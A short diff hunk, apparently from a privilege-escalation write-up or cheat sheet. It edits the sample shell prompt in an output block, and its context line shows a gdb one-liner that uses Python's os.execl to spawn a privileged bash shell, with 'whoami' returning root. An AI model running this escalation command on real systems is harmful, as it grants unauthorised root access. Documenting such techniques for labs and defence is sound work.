@@ -443,7 +443,7 @@ gdb -nx -ex 'python import os; os.execl("/bin/bash", "sh", "-p")' -ex quit
 Info:
 
 ```
-root@connection:~# whoami
+sh-5.0# whoami
 root
 ```
 
